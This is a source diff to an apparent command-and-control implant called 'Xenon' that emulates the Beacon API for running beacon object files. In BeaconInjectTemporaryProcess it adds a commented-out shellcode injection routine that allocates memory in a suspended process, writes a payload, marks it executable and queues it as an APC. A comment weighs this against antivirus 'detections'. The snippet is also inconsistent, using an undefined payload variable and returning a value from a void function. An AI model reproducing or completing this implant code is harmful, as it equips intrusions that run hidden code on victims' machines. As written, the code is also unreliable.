@@ -13,6 +13,7 @@
 #include <stdarg.h>
 #include "Xenon.h"
 #include "Config.h"
+#include "Debug.h"
 
 #ifdef INCLUDE_CMD_INLINE_EXECUTE
 
@@ -346,10 +347,7 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
     return;
 }
 
-/* 
-    I'm not gonna support these currently. The BOF should do these things on their own.
-*/
-/* --------------------------------------------------------------------------------------------------------------------------------------------------------- */
+
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
     BOOL bSuccess = FALSE;
     if (x86) {
@@ -367,7 +365,33 @@ void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_
 }
 
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* Leaving this to be implemented by people needing/wanting it */
+    /* The most basic injection as a placeholder, not sure if I want to include this due to detections */
+    
+    // HANDLE hProc                    = pInfo->hProcess;
+    // HANDLE hThread                  = pInfo->hThread;
+    // SIZE_T szNumberOfBytesWritten   = NULL;
+    // DWORD dwOldProtection           = NULL;
+	// SIZE_T szAllocSize              = p_len;
+
+    // // Allocate
+    // PVOID pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // // Write
+	// if (!WriteProcessMemory(hProc, pAddress, pPayload, p_len, &szNumberOfBytesWritten) || szNumberOfBytesWritten != p_len) {
+	// 	_dbg("[!] Failed to write process memory : %d\n", GetLastError());
+	// 	return;
+	// }
+    // // Memory page executable (RX)
+    // if (!VirtualProtectEx(hProc, pAddress, p_len, PAGE_EXECUTE_READ, &dwOldProtection)) {
+	// 	_dbg("[!] VirtualProtect Failed With Error : %d\n", GetLastError());
+	// 	return;
+	// }
+    // if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
+	// 	_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+	// 	return FALSE;
+	// }
+    // // Execute shellcode
+    // ResumeThread(hThread);
+
     return;
 }
 /* --------------------------------------------------------------------------------------------------------------------------------------------------------- */
